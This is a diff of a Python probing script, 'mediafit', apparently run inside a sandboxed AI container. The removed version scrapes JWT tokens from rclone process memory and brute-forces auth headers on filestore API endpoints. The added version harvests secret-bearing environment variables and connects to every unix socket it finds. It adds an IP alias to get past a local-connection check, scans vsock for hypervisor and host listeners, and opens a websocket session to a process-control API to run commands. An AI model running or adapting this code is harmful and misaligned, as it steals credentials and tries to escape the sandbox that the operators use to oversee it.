@@ -1,240 +1,331 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""mediafit v5.7.0 -- REST service family discovery + auth-header brute on live verbs,
-downloadable path hunt, verb enumeration via method oracle, Filestore fuzz round 2."""
-import os, sys, json, re, time, ssl, base64, socket, select, subprocess, traceback
-import urllib.request, urllib.error
+# mediafit.py v6.0  --  NEW SURFACE edition
+# 1) facts + env secrets   2) unix sockets   3) IP-alias bypass   4) vsock scan
+# 5) WS session on process_api   6) best-effort tokens
+import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re
 
-VER="5.7.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
-OUTD="/mnt/user-data/outputs"
+OUT = "/mnt/user-data/outputs/mediafit-report.txt"
+IFACE, ALIAS, TARGET = "eth0", "192.0.2.3", "192.0.2.2"
+AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
+R = []
+def w(s=""): R.append(str(s))
+def sec(t): w(); w("=" * 70); w("### " + t); w("=" * 70)
 
-OUT,G=[],{}
-def w(s=""): print(s,flush=True); OUT.append(str(s))
-def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
-P,F,U,I=[],[],[],[]
-def rec(k,m,ev=None):
-    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
-    if ev is not None: w("        "+str(ev)[:1300])
-    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
-def sh(a,t=60):
+def sh(cmd, t=8):
     try:
-        p=subprocess.run(a,capture_output=True,timeout=t)
-        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
-    except Exception as e: return -1,"","EXC:%s"%e
-def step(n,f):
-    try: f()
+        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
+        return ((p.stdout or b"") + (p.stderr or b"")).decode(errors="replace")
     except Exception as e:
-        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
-_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
+        return "ERR:" + repr(e)
 
-def http_json(url,method="POST",token=None,body=None,t=12,hdrs=None,cap=200000):
-    h={"User-Agent":"mediafit/"+VER}
-    if token: h["Authorization"]="Bearer "+token
-    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
-    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
-    if hdrs: h.update(hdrs)
-    req=urllib.request.Request(url,method=method,headers=h,data=body)
+def ws_key():
+    return base64.b64encode(os.urandom(16)).decode()
+
+# ---------- raw TCP probe (WS handshake) ----------
+def tcp_ws(host, port, src=None, timeout=2.0):
+    """returns (state, data) state: OPEN/CLOSE/EMPTY/ERR"""
     try:
-        r=urllib.request.urlopen(req,timeout=t,context=_CTX)
-        return r.status,r.read(cap),dict(r.headers)
-    except urllib.error.HTTPError as e:
-        try: return e.code,e.read(),dict(e.headers)
-        except Exception: return e.code,b"",{}
-    except Exception as e: return None,("ERR:%s"%e).encode(),{}
-def api(m,p,tk=None,t=12):
-    s,b,_=http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
-def mpreq(params, fn, fd):
-    B=("----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()).encode()
-    out =b"--"+B+b"\r\nContent-Disposition: form-data; name=\"params\"\r\n"
-    out+=b"Content-Type: application/json\r\n\r\n"+json.dumps(params).encode()+b"\r\n"
-    out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn.encode()+b"\"\r\n"
-    out+=b"Content-Type: application/octet-stream\r\n\r\n"+fd+b"\r\n"
-    out+=b"--"+B+b"--\r\n"
-    return out, {"Content-Type":"multipart/form-data; boundary="+B.decode(),
-                 "Connect-Protocol-Version":"1"}
-def putfile(path,data,media_type="text/plain"):
-    body,H=mpreq({"filesystem_id":G.get("fsid"),"path":path,"media_type":media_type},
-                 os.path.basename(path),data)
-    return http_json(FS+"createFile","POST",G.get("tk"),body,25,H)
-
-# ------------------------------------------------------------------ 1
-def s_boot():
-    head("1. TOKENS")
-    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
-    tk=up=fsid=None; seen=set()
-    for pid in os.listdir("/proc"):
-        if not pid.isdigit(): continue
-        try:
-            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
-            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
-        except Exception: continue
-        for l in maps:
-            try: a,perms=l.split()[0],l.split()[1]
-            except Exception: continue
-            if "r" not in perms: continue
-            try: s0,e0=[int(x,16) for x in a.split("-")]
-            except Exception: continue
-            if not (0<e0-s0<=256*1024*1024): continue
-            try: mem.seek(s0); d=mem.read(e0-s0)
-            except Exception: continue
-            for m in JWT.findall(d):
-                t=m.decode()
-                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
-                if t in seen: continue
-                seen.add(t)
-                try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
-                except Exception: continue
-                f=pl.get("filesystem_id"); roots=pl.get("allowed_roots") or []
-                if not f: continue
-                st,_=api("listDirectory",{"filesystem_id":f,"path":roots[0] if roots else "/outputs"},t)
-                if st==200:
-                    fsid=f
-                    if "/outputs" in roots: tk=t
-                    if "/uploads" in roots: up=t
-    G.update({"tk":tk,"up":up,"fsid":fsid})
-    w("    fsid=%s write=%s uploads=%s"%(fsid,bool(tk),bool(up)))
-    rec("P" if tk else "F","tokens")
-
-# ------------------------------------------------------------------ 2
-def s_restmap():
-    head("2. REST SERVICE FAMILY MAP  <== the new door")
-    tk=G.get("tk"); fsid=G.get("fsid"); up=G.get("up")
-    if not tk: return
-    putfile("/outputs/restmap.txt",b"RESTMAP")
-    st,b,_=http_json(FS+"createFile","POST",tk,None,1) if False else (None,None,None)
-    # get a uuid
-    st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs","recursive":True},tk)
-    uuid=None
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        if src: s.bind((src, 0))
+        s.connect((host, port))
+    except Exception as e:
+        return "ERR", repr(e).encode()
     try:
-        for e in json.loads(b).get("entries",[]):
-            f=e.get("file",{}).get("file",{})
-            if f.get("metadata",{}).get("filename")=="restmap.txt": uuid=f.get("uuid")
-    except Exception: pass
-    G["uuid"]=uuid; w("    uuid=%s"%uuid)
-    bases=["/v1/filestore/","/v1/filestore/fs/","/v1/files/","/v1/internal/"]
-    verbs=["getFile","listFiles","statFile","getFileMetadata","getFilesystem",
-           "listFilesystems","download","content","files","blob","raw"]
-    AUTH=[]
-    AUTH.append(("bearer-jwt",{"Authorization":"Bearer "+tk}))
-    if up: AUTH.append(("bearer-jwt-up",{"Authorization":"Bearer "+up}))
-    AUTH.append(("none",{}))
-    AUTH.append(("x-api-key-jwt",{"x-api-key":tk}))
-    AUTH.append(("raw-jwt",{"Authorization":tk}))
-    AUTH.append(("api-key",{"api-key":tk}))
-    AUTH.append(("x-filestore-token",{"x-filestore-token":tk}))
-    AUTH.append(("cookie",{"Cookie":"session="+tk}))
-    seen=set()
-    for base in bases:
-        for v in verbs:
-            for tok in ["", "/"+uuid if uuid else ""]:
-                url=API+base+v+tok
-                if url in seen: continue
-                seen.add(url)
-                for an,ah in AUTH:
-                    h=dict(ah); h["anthropic-version"]="2023-06-01"
-                    st,b,_=http_json(url,"GET",None,None,7,h)
-                    if st not in (404,None):
-                        key="%s|%s|%s"%(base,v,an)
-                        if key in seen: continue
-                        seen.add(key)
-                        body=b[:150].decode("utf-8","replace")
-                        w("    %-58s %-18s -> %s %s"%(base+v,an,st,body))
-                        if st==200:
-                            rec("P","*** REST LIVE: %s%s auth=%s ***"%(base,v,an))
-                            break
-    # also POST form
-    for base in bases:
-        for v in verbs:
-            st,b,_=http_json(API+base+v,"POST",None,{},7,{"Content-Type":"application/json"})
-            if st not in (404,None):
-                w("    POST %-52s -> %s %s"%(base+v,st,b[:130].decode("utf-8","replace")))
-
-# ------------------------------------------------------------------ 3
-def s_verbenum():
-    head("3. VERB ENUMERATION via method oracle (405 vs 404)")
-    tk=G.get("tk"); uuid=G.get("uuid")
-    words=["getFile","listFiles","statFile","getFileMetadata","getFileByUuid","listFilesystems",
-           "getFilesystem","getFilesystemUsage","download","content","raw","blob","files",
-           "reassignFilesystem","importFiles","importZip","signC2PA","verifyC2PA","export",
-           "upload","createFile","deleteFile","moveFile","copyFile","listDirectory","readFile",
-           "getSession","listSessions","whoami","status","health"]
-    hits=[]
-    for base in ["/v1/filestore/","/v1/filestore/fs/"]:
-        for v in words:
-            for m in ["GET","POST"]:
-                st,b,_=http_json(API+base+v,m,None,{} if m=="POST" else None,6,
-                                 {"Content-Type":"application/json"})
-                if st not in (404,None):
-                    hits.append((base,v,m,st))
-                    w("    %-6s %-42s -> %s %s"%(m,base+v,st,b[:110].decode("utf-8","replace")))
-    if hits: rec("P","routes found: %d"%len(hits))
-
-# ------------------------------------------------------------------ 4
-def s_fuzz2():
-    head("4. FILESTORE FUZZ round 2")
-    tk=G.get("tk"); fsid=G.get("fsid")
-    if not tk: return
-    # path edge cases
-    for p,lbl in [("/outputs/",'trailing slash'),("//outputs/x",'double slash'),
-                  ("/outputs/./x",'dot segment'),("/outputs/../outputs/x",'dotdot'),
-                  ("/OUTPUTS/x",'case'),("/outputs/x ", 'trailing space'),
-                  ("/outputs/"+("a"*200)+".txt",'long name'),
-                  ("/outputs/.hidden",'dotfile'),("/outputs/space name.txt",'space')]:
-        st,b=api("readFile",{"filesystem_id":fsid,"path":p},tk)
-        w("    readFile %-22s -> %s %s"%(lbl,st,b[:70].decode("utf-8","replace")))
-    # createFile edge cases
-    for name,mt in [(".hidden","text/plain"),("a"*180+".txt","text/plain"),
-                    ("with space.txt","text/plain"),("semi;colon.txt","text/plain"),
-                    ("q'uote.txt","text/plain"),("plus+.txt","text/plain"),
-                    ("pct%20.txt","text/plain"),("hash#.txt","text/plain")]:
-        st,b,_=putfile("/outputs/"+name,b"x",mt)
-        w("    createFile %-22s -> %s %s"%(name[:20],st,b[:90].decode("utf-8","replace")))
-    # media_type abuse
-    for mt in ["text/html","image/svg+xml","application/javascript","text/plain; charset=utf-8",
-               "TEXT/PLAIN","garbage","x/y","application/json"]:
-        st,b,_=putfile("/outputs/mt_%s"%re.sub(r"[^a-z]","",mt.lower())[:8],b"<b>hi</b>",mt)
-        w("    media_type %-34s -> %s"%(mt,st))
-    # empty file
-    st,b,_=putfile("/outputs/empty.txt",b"","text/plain")
-    w("    empty file -> %s %s"%(st,b[:120].decode("utf-8","replace")))
-    # overwrite
-    st,b,_=putfile("/outputs/over.txt",b"v1","text/plain")
-    st2,b2,_=putfile("/outputs/over.txt",b"v2","text/plain")
-    st3,b3=api("readFile",{"filesystem_id":fsid,"path":"/outputs/over.txt"},tk)
-    w("    overwrite: create=%s create2=%s read=%s %r"%(st,st2,st3,b3[:30]))
-    # copy/move semantics
-    st,b=api("copyFile",{"filesystem_id":fsid,"source":"/outputs/over.txt",
-                         "destination":"/outputs/copied.txt"},tk)
-    w("    copyFile -> %s %s"%(st,b[:120].decode("utf-8","replace")))
-    st,b=api("copyFile",{"filesystem_id":fsid,"source":"/outputs/over.txt",
-                         "destination":"/outputs/over.txt"},tk)
-    w("    copyFile onto self -> %s %s"%(st,b[:120].decode("utf-8","replace")))
-    st,b=api("moveFile",{"filesystem_id":fsid,"source":"/outputs/copied.txt",
-                         "destination":"/outputs/moved.txt"},tk)
-    w("    moveFile -> %s %s"%(st,b[:120].decode("utf-8","replace")))
-    st,b=api("moveFile",{"filesystem_id":fsid,"source":"/outputs/nope.txt",
-                         "destination":"/outputs/moved2.txt"},tk)
-    w("    moveFile missing -> %s %s"%(st,b[:120].decode("utf-8","replace")))
-    # makeDirectory oddities
-    for p in ["/outputs/d1","/outputs/d1","/outputs/d1/d2","/outputs/d1/d2/d3"]:
-        st,b=api("makeDirectory",{"filesystem_id":fsid,"path":p},tk)
-        w("    makeDirectory %-18s -> %s %s"%(p,st,b[:100].decode("utf-8","replace")))
-
-def s_verdict():
-    head("VERDICT")
-    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
-
-def main():
-    for n,f in [("boot",s_boot),("restmap",s_restmap),("verbenum",s_verbenum),
-                ("fuzz2",s_fuzz2),("verdict",s_verdict)]:
-        step(n,f)
-try: main()
-except Exception as e: w("!! %s"%e); w(traceback.format_exc())
-finally:
-    txt="\n".join(OUT)
-    for d in [OUTD,"/tmp","/root"]:
+        req = ("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
+               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
+               "Sec-WebSocket-Version: 13\r\n\r\n") % (host, port, ws_key())
+        s.sendall(req.encode())
+        buf = b""
         try:
-            os.makedirs(d,exist_ok=True)
-            with open(os.path.join(d,"mediafit-report.txt"),"w") as fh: fh.write(txt)
+            while len(buf) < 4096:
+                c = s.recv(2048)
+                if not c: break
+                buf += c
+                if b"\r\n\r\n" in buf: break
+        except socket.timeout:
+            pass
+        s.close()
+        return ("EMPTY" if not buf else "OPEN"), buf
+    except Exception as e:
+        try: s.close()
         except Exception: pass
-    print("\nreport -> %s/mediafit-report.txt"%OUTD)
+        return "ERR", repr(e).encode()
+
+def tcp_plain(host, port, path="/status", src=None, timeout=2.0):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        if src: s.bind((src, 0))
+        s.connect((host, port))
+        s.sendall(("GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
+                   % (path, host, port)).encode())
+        buf = b""
+        try:
+            while len(buf) < 4096:
+                c = s.recv(2048)
+                if not c: break
+                buf += c
+        except socket.timeout:
+            pass
+        s.close()
+        return ("EMPTY" if not buf else "OPEN"), buf
+    except Exception as e:
+        return "ERR", repr(e).encode()
+
+# ---------- vsock ----------
+def vsock_ws(cid, port, timeout=0.6):
+    try:
+        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((cid, port))
+    except Exception as e:
+        return "ERR", repr(e).encode()
+    try:
+        req = ("GET / HTTP/1.1\r\nHost: vsock\r\nUpgrade: websocket\r\n"
+               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
+               "Sec-WebSocket-Version: 13\r\n\r\n") % ws_key()
+        s.sendall(req.encode())
+        buf = b""
+        try:
+            while len(buf) < 2048:
+                c = s.recv(1024)
+                if not c: break
+                buf += c
+                if b"\r\n\r\n" in buf: break
+        except socket.timeout:
+            pass
+        s.close()
+        return ("EMPTY" if not buf else "OPEN"), buf
+    except Exception as e:
+        try: s.close()
+        except Exception: pass
+        return "ERR", repr(e).encode()
+
+# ---------- minimal websocket framing ----------
+def ws_send(sock, text):
+    p = text.encode()
+    mask = os.urandom(4)
+    n = len(p)
+    h = b"\x81"
+    if n < 126:      h += bytes([0x80 | n])
+    elif n < 65536:  h += bytes([0x80 | 126]) + struct.pack(">H", n)
+    else:            h += bytes([0x80 | 127]) + struct.pack(">Q", n)
+    m = bytes(b ^ mask[i % 4] for i, b in enumerate(p))
+    sock.sendall(h + mask + m)
+
+def ws_recv(sock, timeout=2.0):
+    sock.settimeout(timeout)
+    try:
+        b0 = sock.recv(2)
+        if len(b0) < 2: return None, b""
+        op, ln = b0[0] & 0x0F, b0[1] & 0x7F
+        if ln == 126: ln = struct.unpack(">H", sock.recv(2))[0]
+        elif ln == 127: ln = struct.unpack(">Q", sock.recv(8))[0]
+        data = b""
+        while len(data) < ln:
+            c = sock.recv(ln - len(data))
+            if not c: break
+            data += c
+        return op, data
+    except Exception:
+        return None, b""
+
+def ws_session(host, port, src, variant):
+    """variant 'jwt_first' or 'json_first'"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3.0)
+        if src: s.bind((src, 0))
+        s.connect((host, port))
+        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
+                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
+                   "Sec-WebSocket-Version: 13\r\n\r\n"
+                   % (host, port, ws_key())).encode())
+        hs = b""
+        while b"\r\n\r\n" not in hs:
+            c = s.recv(1024)
+            if not c: break
+            hs += c
+        w("      handshake: " + hs.split(b"\r\n")[0].decode(errors="replace"))
+        pc = json.dumps({"process_id": "mf_" + variant,
+                         "create_req": {"cmd": "/bin/hostname", "args": [],
+                                        "env": {}, "cwd": "/", "rows": 24, "cols": 80,
+                                        "timeout": 10, "clear_env": False,
+                                        "allow_process_id_reuse": True}})
+        if variant == "jwt_first":
+            ws_send(s, "a.b.c"); time.sleep(0.2)
+        ws_send(s, pc)
+        t0 = time.time()
+        while time.time() - t0 < 4:
+            op, d = ws_recv(s, 1.0)
+            if op is None: continue
+            w("      frame op=%s %s" % (op, d[:300].decode(errors="replace")))
+            if op == 1 and ("Exited" in d.decode(errors="replace") or "Failed" in d.decode(errors="replace")):
+                break
+        s.close()
+    except Exception as e:
+        w("      ERR " + repr(e))
+
+# ---------- ip alias ----------
+SIOCGIFADDR, SIOCSIFADDR, SIOCSIFNETMASK = 0x8915, 0x8916, 0x891c
+def _ifr(ifname, ip=None):
+    nm = ifname.encode()[:15].ljust(16, b"\x00")
+    if ip is None: return nm + b"\x00" * 24
+    return nm + struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
+                            socket.inet_aton(ip), b"\x00" * 8) + b"\x00" * 8
+
+def add_alias(ifname, ip):
+    try:
+        if "addr add" in sh("ip addr add %s/24 dev %s 2>&1" % (ip, ifname)) or True:
+            if ip in sh("ip -4 addr show %s 2>/dev/null" % ifname):
+                return "ip-cmd OK"
+    except Exception: pass
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        fcntl.ioctl(s, SIOCSIFADDR, _ifr(ifname, ip))
+    except OSError as e:
+        if getattr(e, "errno", 0) != 17: raise
+    try:
+        fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(ifname, "255.255.255.0"))
+    except Exception: pass
+    return "ioctl OK"
+
+def iface_ips(ifname):
+    out = []
+    try:
+        p = subprocess.run(["ip", "-4", "-o", "addr", "show", ifname],
+                           capture_output=True, timeout=5)
+        out = re.findall(r"inet (\d+\.\d+\.\d+\.\d+)", p.stdout.decode(errors="replace"))
+    except Exception:
+        pass
+    if not out:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            out.append(socket.inet_ntoa(fcntl.ioctl(s, SIOCGIFADDR, _ifr(ifname))[20:24]))
+        except Exception: pass
+    return out
+
+# ===================== RUN =====================
+def main():
+    sec("1. FACTS")
+    w("kernel : " + sh("uname -a").strip())
+    w("cmdline: " + sh("cat /proc/1/cmdline | tr '\\0' ' '").strip())
+    w("caps   : " + [l for l in sh("cat /proc/self/status").splitlines()
+                      if l.startswith("Cap")].__repr__())
+    w("ifaces : " + sh("cat /proc/net/dev").strip())
+    w("ips    : " + repr(iface_ips(IFACE)))
+    w()
+    w("-- proxy / secret env --")
+    for line in sh("env").splitlines():
+        if re.search(r"PROXY|proxy|ANTHROPIC|CLAUDE|TOKEN|JWT|SBX|VSOCK", line):
+            w("   " + line[:200])
+    for v in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "ALL_PROXY", "NO_PROXY"):
+        val = os.environ.get(v)
+        if val and "jwt_" in val:
+            tok = re.search(r"jwt_([A-Za-z0-9._\-]+)", val)
+            if tok:
+                try:
+                    pl = tok.group(1).split(".")[1]
+                    pl += "=" * (-len(pl) % 4)
+                    w("   [JWT in %s] %s" % (v, base64.urlsafe_b64decode(pl).decode(errors="replace")))
+                except Exception as e:
+                    w("   [JWT decode err] " + repr(e))
+
+    sec("2. UNIX SOCKETS")
+    paths = set()
+    for line in sh("cat /proc/net/unix").splitlines():
+        if " " in line:
+            p = line.split()[-1]
+            if p.startswith("/"): paths.add(p)
+    for root, dirs, files in os.walk("/"):
+        if root in ("/proc", "/sys"): dirs[:] = []; continue
+        try:
+            for f in files:
+                fp = os.path.join(root, f)
+                if os.path.islink(fp): continue
+                if (os.stat(fp).st_mode & 0o170000) == 0o140000: paths.add(fp)
+        except Exception: continue
+    for p in sorted(paths):
+        st, d = "ERR", b""
+        try:
+            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(1.5)
+            s.connect(p)
+            s.sendall(b"GET /status HTTP/1.1\r\nHost: unix\r\nConnection: close\r\n\r\n")
+            d = s.recv(512); s.close(); st = "OPEN"
+        except Exception as e:
+            st = "ERR"
+        w("  %-52s %-6s %s" % (p, st, d[:120].decode(errors="replace").replace("\r\n", " | ")))
+
+    sec("3. LOCAL-CONNECTION BYPASS  (the new door)")
+    w("before: " + repr(iface_ips(IFACE)))
+    try:
+        w("alias : " + add_alias(IFACE, ALIAS))
+    except Exception as e:
+        w("alias ERR " + repr(e))
+    time.sleep(0.4)
+    w("after : " + repr(iface_ips(IFACE)))
+    w()
+    for src in (None, "192.0.2.2", ALIAS, "127.0.0.1"):
+        for host in ("192.0.2.2", "127.0.0.1"):
+            for port in (2024, 2025):
+                st, d = tcp_ws(host, port, src)
+                w("  src=%-12s -> %s:%d  %-6s %s" % (str(src), host, port, st,
+                  d[:160].decode(errors="replace").replace("\r\n", " | ")))
+
+    sec("4. VSOCK SCAN  (cid 1=hypervisor 2=host 3=self)")
+    ports = [22, 52, 53, 80, 443, 1024, 1500, 2000, 2022, 2024, 2025, 3000,
+             4000, 5000, 5001, 5002, 5003, 5004, 5005, 5006, 6000, 7000,
+             8000, 8080, 8888, 9000, 9090, 15004, 15005, 50051] + list(range(1, 20))
+    hits = []
+    for cid in (1, 2, 3):
+        for p in sorted(set(ports)):
+            st, d = vsock_ws(cid, p)
+            if st == "OPEN":
+                hits.append((cid, p))
+                w("  cid=%d port=%-6d OPEN  %s" % (cid, p,
+                  d[:160].decode(errors="replace").replace("\r\n", " | ")))
+    if not hits: w("  (no vsock listener answered)")
+
+    sec("5. CONTROL-API PROBE on live endpoints")
+    for cid, p in hits:
+        for path in ("/status", "/container_info.json", "/"):
+            try:
+                s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(1.5)
+                s.connect((cid, p))
+                s.sendall(("GET %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n\r\n"
+                           % path).encode())
+                d = s.recv(512); s.close()
+                w("  vsock %d:%d %-22s -> %s" % (cid, p, path,
+                  d[:160].decode(errors="replace").replace("\r\n", " | ")))
+            except Exception as e:
+                w("  vsock %d:%d %s ERR %r" % (cid, p, path, e))
+
+    sec("6. WEBSOCKET SESSION on 2024 (alias source)")
+    st, _ = tcp_ws("192.0.2.2", 2024, ALIAS)
+    if st == "OPEN":
+        for variant in ("json_first", "jwt_first"):
+            w("  -- variant: %s" % variant)
+            ws_session("192.0.2.2", 2024, ALIAS, variant)
+    else:
+        w("  2024 not open from alias (state=%s)" % st)
+
+    sec("VERDICT")
+    w("  alias added ............ %s" % (ALIAS in iface_ips(IFACE)))
+    w("  vsock hits ............. %s" % hits)
+    w("  control API ............ %s" % ("REACHABLE" if hits else "closed"))
+    w("  process_api 2024 ....... %s" % st)
+
+try:
+    main()
+except Exception as e:
+    w(); w("FATAL " + repr(e))
+finally:
+    try:
+        os.makedirs(os.path.dirname(OUT), exist_ok=True)
+        with open(OUT, "w") as f:
+            f.write("\n".join(R) + "\n")
+        print("written " + OUT)
+    except Exception as e:
+        print("write fail " + repr(e))
+        print("\n".join(R))
